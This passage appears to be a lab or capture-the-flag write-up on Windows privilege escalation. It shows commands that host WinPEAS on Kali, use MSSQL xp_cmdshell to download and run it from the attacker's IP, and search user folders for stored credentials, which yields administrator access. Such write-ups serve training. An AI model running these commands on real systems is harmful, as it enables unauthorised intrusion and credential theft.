# Downloading WinPEAS

*To enumerate possible privilege escalation paths, I decided to use WinPEAS.*

Download it on Kali:

```bash
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe
```

Rename it:

```bash
mv winPEASx64.exe wp.exe
```

*Short filenames make command execution easier later.*

---

# Hosting the File

Check VPN IP:

```bash
ip a | grep tun0
```

Start a simple HTTP server:

```bash
python3 -m http.server 1337
```

## Results

```text
Serving HTTP on 0.0.0.0 port 1337
```

---

# Transferring WinPEAS

*The plan is to transfer `wp.exe` from Kali to the target machine using PowerShell and `xp_cmdshell`.*

```sql
EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest http://10.10.15.56:1337/wp.exe -OutFile C:\Windows\Temp\wp.exe"';
```

Verify the transfer:

```sql
EXEC xp_cmdshell 'dir C:\Windows\Temp';
```

---

# Executing WinPEAS

Run WinPEAS:

```sql
EXEC xp_cmdshell 'C:\Windows\Temp\wp.exe';
```

Or save the output to a file:

```sql
EXEC xp_cmdshell 'C:\Windows\Temp\wp.exe > C:\Windows\Temp\results.txt';
```

Read the output:

```sql
EXEC xp_cmdshell 'type C:\Windows\Temp\results.txt';
```

---

# Searching for Credentials

*The WinPEAS output was very large, so I manually searched for interesting files and possible credentials.*

Search recursively for text files:

```sql
EXEC xp_cmdshell 'dir C:\Users\*.txt /s';
```

Read suspicious files:

```sql
EXEC xp_cmdshell 'type C:\path\to\file.txt';
```

*Eventually, administrator credentials were discovered inside a text file.*

---

# Privilege Escalation

*Using the recovered administrator credentials, I was able to escalate privileges and gain full administrative access to the target.*

